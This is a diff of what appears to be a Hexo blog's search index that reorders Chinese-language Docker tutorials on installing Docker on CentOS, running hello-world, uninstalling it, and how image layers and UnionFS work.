+</li>
+</ul>
+<h2 id="2、环境查看"><a href="#2、环境查看" class="headerlink" title="2、环境查看"></a>2、环境查看</h2><p>&emsp;&emsp;<code>uname -r</code>     #可以看到系统内核是3.0以上的（根据目前最新版本的Docker最好用3.0以上的）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630190998027-5178b78c-86a9-4d77-9e6d-58e9c47ef1bc.png" alt="img"></p>
+<p>&emsp;&emsp;<code>cat /etc/os-release</code>    #操作系统版本等信息，可以看到为CentOS7</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191045289-d8e49bd7-1e5f-445e-8a15-887b4c23a23a.png" alt="img"></p>
+<h2 id="3、安装"><a href="#3、安装" class="headerlink" title="3、安装"></a>3、安装</h2><p>&emsp;&emsp;查看帮助文档</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191257923-ca08032d-432d-453b-b306-0536f273e86d.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191291748-ec54e317-e612-4404-a188-93e32caba267.png" alt="img"></p>
+<h3 id="（1）卸载旧的版本"><a href="#（1）卸载旧的版本" class="headerlink" title="（1）卸载旧的版本"></a>（1）卸载旧的版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191459582-c6298c53-8019-49e0-aa05-3ed98add9b91.png" alt="img"></p>
+<h3 id="（2）需要的安装包"><a href="#（2）需要的安装包" class="headerlink" title="（2）需要的安装包"></a>（2）需要的安装包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure>
+
+<h3 id><a href="#" class="headerlink" title></a><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630192978202-9ea6b98b-6354-41dc-83cb-8a668a6fe77f.png" alt="img"></h3><h3 id="（3）设置镜像的仓库"><a href="#（3）设置镜像的仓库" class="headerlink" title="（3）设置镜像的仓库"></a>（3）设置镜像的仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo   #默认是国外的</span><br><span class="line"><span class="meta">#</span><span class="bash">建议用国内的，这里用了阿里云的</span></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193327326-54bbb9ee-11b0-4d51-bd3e-0dfd8b5207ba.png" alt="img"></p>
+<h3 id="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"><a href="#（4）更新yum软件包索引（文档并没有，但是推荐先这样做）" class="headerlink" title="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"></a>（4）更新yum软件包索引（文档并没有，但是推荐先这样做）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193742930-52d2c07c-00a5-44b7-a3d6-608b84ca0bbd.png" alt="img"></p>
+<h3 id="（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）"><a href="#（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）" class="headerlink" title="（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）"></a>（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用docker version命令查看是否安装成功</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193895408-06452251-6f2b-4b08-a74b-58df248e2597.png" alt="img"></p>
+<h3 id="（6）启动Docker"><a href="#（6）启动Docker" class="headerlink" title="（6）启动Docker"></a>（6）启动Docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<h3 id="（7）运行hello-world"><a href="#（7）运行hello-world" class="headerlink" title="（7）运行hello-world"></a>（7）运行hello-world</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194278515-365cb481-1185-4483-a8bf-4d29f18e2ffa.png" alt="img"></p>
+<h3 id="（8）查看下载的hello-world镜像"><a href="#（8）查看下载的hello-world镜像" class="headerlink" title="（8）查看下载的hello-world镜像"></a>（8）查看下载的hello-world镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images   </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194342773-168e10b3-0461-4293-8147-a4c3b044dc3f.png" alt="img"></p>
+<h2 id="4、卸载Docker（了解）"><a href="#4、卸载Docker（了解）" class="headerlink" title="4、卸载Docker（了解）"></a>4、卸载Docker（了解）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、卸载依赖</span></span><br><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、删除资源</span></span><br><span class="line">sudo rm -rf /var/lib/docker   # /var/lib/docker 为Docker的默认工作路径</span><br></pre></td></tr></table></figure>
+
+<h1 id="三、回顾hello-world流程"><a href="#三、回顾hello-world流程" class="headerlink" title="三、回顾hello-world流程"></a>三、回顾hello-world流程</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630195539318-3872e867-2f1d-4109-8891-81ca87e72d0e.png" alt="img"></p>
+<h1 id="四、底层原理"><a href="#四、底层原理" class="headerlink" title="四、底层原理"></a>四、底层原理</h1><h2 id="1、Docker是怎么工作的"><a href="#1、Docker是怎么工作的" class="headerlink" title="1、Docker是怎么工作的"></a>1、Docker是怎么工作的</h2><p>&emsp;&emsp;Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p>
+<p>&emsp;&emsp;DockerServer接收到Docker-Client的指令，就会执行这个命令</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630196704765-f6761549-9aca-4a85-b1b8-6ba89161125a.png" alt="img"></p>
+<h2 id="2、Docker为什么比VM快"><a href="#2、Docker为什么比VM快" class="headerlink" title="2、Docker为什么比VM快"></a>2、Docker为什么比VM快</h2><p>&emsp;&emsp;Docker有着比虚拟机更少的抽象层</p>
+<p>&emsp;&emsp;Docker利用的是宿主机的内核，VM需要是Guset OS</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630197561993-9b8796b3-5854-4163-a8a5-c5ee38d9caba.jpeg" alt="img"></p>
+<p>&emsp;&emsp;所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而Docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！</p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dockerfile文件</title>
     <url>/post/fba1b6b.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、什么是DockerFile"><a href="#一、什么是DockerFile" class="headerlink" title="一、什么是DockerFile"></a>一、什么是DockerFile</h1><p>&emsp;&emsp;Dockerfile是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。Docker通过读取Dockerfile中的指令自动生成映像。</p>
@@ -6258,74 +6326,6 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]# cd tomcatlogs</span><br><span class="line">[root@VM-0-15-centos tomcatlogs]# ls</span><br><span class="line">catalina.2021-09-04.log  catalina.out  localhost.2021-09-04.log  localhost_access_log.2021-09-04.txt</span><br><span class="line">[root@VM-0-15-centos tomcatlogs]# cat catalina.out</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630778803163-49f833a3-3c41-45da-8572-1cbaedab4492.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker安装</title>
-    <url>/post/327177db.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker的基本组成"><a href="#一、Docker的基本组成" class="headerlink" title="一、Docker的基本组成"></a>一、Docker的基本组成</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630189658121-fda48094-6318-4c60-b251-4e740542c1fc.png" alt="img"></p>
-<p><strong>1、镜像（image）：</strong></p>
-<p>&emsp;&emsp;Docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，Tomcat镜像==&gt;run==&gt;Tomecat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务或者项目运行就是在容器中的</p>
-<p><strong>2、容器（container）：</strong></p>
-<p>&emsp;&emsp;通过镜像来创建的</p>
-<p>&emsp;&emsp;Docker利用容器技术，独立运行一个或者一组应用</p>
-<p>&emsp;&emsp;目前就可以把这个容器理解为就是一个简易的Linux系统</p>
-<p><strong>3、仓库（repository）：</strong></p>
-<p>&emsp;&emsp;仓库就是存放镜像的地方</p>
-<p>&emsp;&emsp;仓库分为公有仓库和私有仓库</p>
-<h1 id="二、安装Docker"><a href="#二、安装Docker" class="headerlink" title="二、安装Docker"></a>二、安装Docker</h1><h2 id="1、环境准备"><a href="#1、环境准备" class="headerlink" title="1、环境准备"></a>1、环境准备</h2><ul>
-<li><p>需要Linux基础</p>
-</li>
-<li><p>CentOS7</p>
-</li>
-<li><p>使用XShell等连接远程服务器进行操作</p>
-</li>
-</ul>
-<h2 id="2、环境查看"><a href="#2、环境查看" class="headerlink" title="2、环境查看"></a>2、环境查看</h2><p>&emsp;&emsp;<code>uname -r</code>     #可以看到系统内核是3.0以上的（根据目前最新版本的Docker最好用3.0以上的）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630190998027-5178b78c-86a9-4d77-9e6d-58e9c47ef1bc.png" alt="img"></p>
-<p>&emsp;&emsp;<code>cat /etc/os-release</code>    #操作系统版本等信息，可以看到为CentOS7</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191045289-d8e49bd7-1e5f-445e-8a15-887b4c23a23a.png" alt="img"></p>
-<h2 id="3、安装"><a href="#3、安装" class="headerlink" title="3、安装"></a>3、安装</h2><p>&emsp;&emsp;查看帮助文档</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191257923-ca08032d-432d-453b-b306-0536f273e86d.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191291748-ec54e317-e612-4404-a188-93e32caba267.png" alt="img"></p>
-<h3 id="（1）卸载旧的版本"><a href="#（1）卸载旧的版本" class="headerlink" title="（1）卸载旧的版本"></a>（1）卸载旧的版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630191459582-c6298c53-8019-49e0-aa05-3ed98add9b91.png" alt="img"></p>
-<h3 id="（2）需要的安装包"><a href="#（2）需要的安装包" class="headerlink" title="（2）需要的安装包"></a>（2）需要的安装包</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br></pre></td></tr></table></figure>
-
-<h3 id><a href="#" class="headerlink" title></a><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630192978202-9ea6b98b-6354-41dc-83cb-8a668a6fe77f.png" alt="img"></h3><h3 id="（3）设置镜像的仓库"><a href="#（3）设置镜像的仓库" class="headerlink" title="（3）设置镜像的仓库"></a>（3）设置镜像的仓库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo   #默认是国外的</span><br><span class="line"><span class="meta">#</span><span class="bash">建议用国内的，这里用了阿里云的</span></span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193327326-54bbb9ee-11b0-4d51-bd3e-0dfd8b5207ba.png" alt="img"></p>
-<h3 id="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"><a href="#（4）更新yum软件包索引（文档并没有，但是推荐先这样做）" class="headerlink" title="（4）更新yum软件包索引（文档并没有，但是推荐先这样做）"></a>（4）更新yum软件包索引（文档并没有，但是推荐先这样做）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193742930-52d2c07c-00a5-44b7-a3d6-608b84ca0bbd.png" alt="img"></p>
-<h3 id="（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）"><a href="#（5）安装Docker相关依赖（docker-ce-社区版-ee-企业版）" class="headerlink" title="（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）"></a>（5）安装Docker相关依赖（docker-ce 社区版  ee 企业版）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta">#</span><span class="bash">可以使用docker version命令查看是否安装成功</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630193895408-06452251-6f2b-4b08-a74b-58df248e2597.png" alt="img"></p>
-<h3 id="（6）启动Docker"><a href="#（6）启动Docker" class="headerlink" title="（6）启动Docker"></a>（6）启动Docker</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
-
-<h3 id="（7）运行hello-world"><a href="#（7）运行hello-world" class="headerlink" title="（7）运行hello-world"></a>（7）运行hello-world</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194278515-365cb481-1185-4483-a8bf-4d29f18e2ffa.png" alt="img"></p>
-<h3 id="（8）查看下载的hello-world镜像"><a href="#（8）查看下载的hello-world镜像" class="headerlink" title="（8）查看下载的hello-world镜像"></a>（8）查看下载的hello-world镜像</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images   </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630194342773-168e10b3-0461-4293-8147-a4c3b044dc3f.png" alt="img"></p>
-<h2 id="4、卸载Docker（了解）"><a href="#4、卸载Docker（了解）" class="headerlink" title="4、卸载Docker（了解）"></a>4、卸载Docker（了解）</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、卸载依赖</span></span><br><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、删除资源</span></span><br><span class="line">sudo rm -rf /var/lib/docker   # /var/lib/docker 为Docker的默认工作路径</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、回顾hello-world流程"><a href="#三、回顾hello-world流程" class="headerlink" title="三、回顾hello-world流程"></a>三、回顾hello-world流程</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630195539318-3872e867-2f1d-4109-8891-81ca87e72d0e.png" alt="img"></p>
-<h1 id="四、底层原理"><a href="#四、底层原理" class="headerlink" title="四、底层原理"></a>四、底层原理</h1><h2 id="1、Docker是怎么工作的"><a href="#1、Docker是怎么工作的" class="headerlink" title="1、Docker是怎么工作的"></a>1、Docker是怎么工作的</h2><p>&emsp;&emsp;Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p>
-<p>&emsp;&emsp;DockerServer接收到Docker-Client的指令，就会执行这个命令</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630196704765-f6761549-9aca-4a85-b1b8-6ba89161125a.png" alt="img"></p>
-<h2 id="2、Docker为什么比VM快"><a href="#2、Docker为什么比VM快" class="headerlink" title="2、Docker为什么比VM快"></a>2、Docker为什么比VM快</h2><p>&emsp;&emsp;Docker有着比虚拟机更少的抽象层</p>
-<p>&emsp;&emsp;Docker利用的是宿主机的内核，VM需要是Guset OS</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630197561993-9b8796b3-5854-4163-a8a5-c5ee38d9caba.jpeg" alt="img"></p>
-<p>&emsp;&emsp;所以说，新建一个容器的时候，docker不需要像虚拟机一样重新加载一个操作系统内核，避免引导。虚拟机是加载Guest OS，分钟级别的，而Docker是利用宿主机的操作系统，省略了这个复杂的过程，秒级！</p>
 ]]></content>
       <categories>
         <category>docker</category>
@@ -6796,6 +6796,55 @@
       </tags>
   </entry>
   <entry>
+    <title>docker镜像讲解</title>
+    <url>/post/9e39f1c0.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、镜像是什么"><a href="#一、镜像是什么" class="headerlink" title="一、镜像是什么"></a>一、镜像是什么</h1><p>&emsp;&emsp;镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
+<p>&emsp;&emsp;所有的应用，直接打包docker镜像，就可以直接跑起来</p>
+<p>&emsp;&emsp;如何得到镜像：</p>
+<ul>
+<li><p>从远程仓库下载</p>
+</li>
+<li><p>朋友拷贝给你</p>
+</li>
+<li><p>自己制作一个镜像DockerFile</p>
+</li>
+</ul>
+<h1 id="二、Docker镜像加载原理"><a href="#二、Docker镜像加载原理" class="headerlink" title="二、Docker镜像加载原理"></a>二、Docker镜像加载原理</h1><h2 id="1、UnionFS（联合文件系统）"><a href="#1、UnionFS（联合文件系统）" class="headerlink" title="1、UnionFS（联合文件系统）"></a>1、UnionFS（联合文件系统）</h2><p>&emsp;&emsp;UnionFS (联合文件系统) : Union文件系统( UnionFS)是一种分层、 轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像）,可以制作各种具体的应用镜像。</p>
+<p>&emsp;&emsp;特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
+<p>&emsp;&emsp;我们下载镜像的时候看到的一层层就是这个</p>
+<h2 id="2、Docker镜像加载原理"><a href="#2、Docker镜像加载原理" class="headerlink" title="2、Docker镜像加载原理"></a>2、Docker镜像加载原理</h2><p>&emsp;&emsp;Docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p>
+<p>&emsp;&emsp;BootFS（Boot File System）主要包含bootloader和kernel，bootloader主要是引|导加载kernel，Linux刚启动时会加载BootFS文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由BootFS转交给内核，此时系统也会卸载bootfs.</p>
+<p>&emsp;&emsp;RootFS (Root File System) ，在bootfs之上。包含的就是典型Linux 系统中的/dev， /proc， /bin， /etc等标准目录和文件。RootFS就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378194134-f0a43a44-9cb2-42da-9175-edcc615c4fe6.png" alt="img"></p>
+<p>&emsp;&emsp;平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378258217-0d43a7c0-6a45-4f54-a4ee-30bfba0c7b89.png" alt="img"></p>
+<p>&emsp;&emsp;对于一个精简的OS，RootfFS可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供RootFS就可以了。由此可见对于不同的linux发行版，BootFS基本是一致的，RootFS会有差别，因此不同的发行版可以公用BootFS。</p>
+<h2 id="3、分层理解"><a href="#3、分层理解" class="headerlink" title="3、分层理解"></a>3、分层理解</h2><h3 id="（1）分层的镜像"><a href="#（1）分层的镜像" class="headerlink" title="（1）分层的镜像"></a>（1）分层的镜像</h3><p>&emsp;&emsp;我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378524848-56f34cbd-f790-4491-bdd2-420762fb2cc0.png" alt="img"></p>
+<p>&emsp;&emsp;思考：为什么Docker镜像要采用这种分层的结构呢？</p>
+<p>&emsp;&emsp;最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。</p>
+<p>&emsp;&emsp;查看镜像分层的方式可以通过<code>docker image inspect 镜像名</code>命令！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379789310-2a328dcd-b855-4773-aa75-f440c93564d7.png" alt="img"></p>
+<h3 id="（2）理解"><a href="#（2）理解" class="headerlink" title="（2）理解"></a>（2）理解</h3><p>&emsp;&emsp;所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p>
+<p>&emsp;&emsp;举一个简单的例子，假如基于Ubuntu Linux 16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p>
+<p>&emsp;&emsp;该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379931355-662a173d-b5ac-4619-b929-442a4c543d46.png" alt="img"></p>
+<p>&emsp;&emsp;在添加额外的镜像层的同时,镜像始终保持是当前所有镜像的组合，理解这一点点常重要。 图中举了一个简单的例子，每个镜像包含3个文件，而镜像包含了来自两个镜像层的6个文件。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379992732-33c35650-e3dc-4a97-bb5e-39ab82693187.png" alt="img"></p>
+<p>&emsp;&emsp;上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380069106-5f074aae-bb2e-40aa-b8ba-07430052ebe6.png" alt="img"></p>
+<p>&emsp;&emsp;这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。</p>
+<p>&emsp;&emsp;Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈,，保证多镜像层对外展示为统一的文件系统。</p>
+<p>&emsp;&emsp;Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎擎都有其独有的性能特点。</p>
+<p>&emsp;&emsp;Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</p>
+<p>&emsp;&emsp;下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380496024-abad9527-7903-4fc7-a9ed-a7874baa30b8.png" alt="img"></p>
+<h3 id="（3）特点"><a href="#（3）特点" class="headerlink" title="（3）特点"></a>（3）特点</h3><p>&emsp;&emsp;Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p>
+<p>&emsp;&emsp;这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380628445-60392a4a-a129-45e5-a53a-050579f46cd0.png" alt="img"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>lnk快捷方式钓鱼</title>
     <url>/post/1cb9d074.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。</p>
@@ -7163,55 +7212,6 @@
       </tags>
   </entry>
   <entry>
-    <title>docker镜像讲解</title>
-    <url>/post/9e39f1c0.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、镜像是什么"><a href="#一、镜像是什么" class="headerlink" title="一、镜像是什么"></a>一、镜像是什么</h1><p>&emsp;&emsp;镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
-<p>&emsp;&emsp;所有的应用，直接打包docker镜像，就可以直接跑起来</p>
-<p>&emsp;&emsp;如何得到镜像：</p>
-<ul>
-<li><p>从远程仓库下载</p>
-</li>
-<li><p>朋友拷贝给你</p>
-</li>
-<li><p>自己制作一个镜像DockerFile</p>
-</li>
-</ul>
-<h1 id="二、Docker镜像加载原理"><a href="#二、Docker镜像加载原理" class="headerlink" title="二、Docker镜像加载原理"></a>二、Docker镜像加载原理</h1><h2 id="1、UnionFS（联合文件系统）"><a href="#1、UnionFS（联合文件系统）" class="headerlink" title="1、UnionFS（联合文件系统）"></a>1、UnionFS（联合文件系统）</h2><p>&emsp;&emsp;UnionFS (联合文件系统) : Union文件系统( UnionFS)是一种分层、 轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）。Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像）,可以制作各种具体的应用镜像。</p>
-<p>&emsp;&emsp;特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层的文件和目录</p>
-<p>&emsp;&emsp;我们下载镜像的时候看到的一层层就是这个</p>
-<h2 id="2、Docker镜像加载原理"><a href="#2、Docker镜像加载原理" class="headerlink" title="2、Docker镜像加载原理"></a>2、Docker镜像加载原理</h2><p>&emsp;&emsp;Docker的镜像实际上由一层一层的文件系统组成，这种层级的文件系统UnionFS。</p>
-<p>&emsp;&emsp;BootFS（Boot File System）主要包含bootloader和kernel，bootloader主要是引|导加载kernel，Linux刚启动时会加载BootFS文件系统，在Docker镜像的最底层是bootfs。这一层与我们典型的Linux/Unix系统是一样的，包含boot加载器和内核。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由BootFS转交给内核，此时系统也会卸载bootfs.</p>
-<p>&emsp;&emsp;RootFS (Root File System) ，在bootfs之上。包含的就是典型Linux 系统中的/dev， /proc， /bin， /etc等标准目录和文件。RootFS就是各种不同的操作系统发行版，比如Ubuntu，Centos等等。</p>
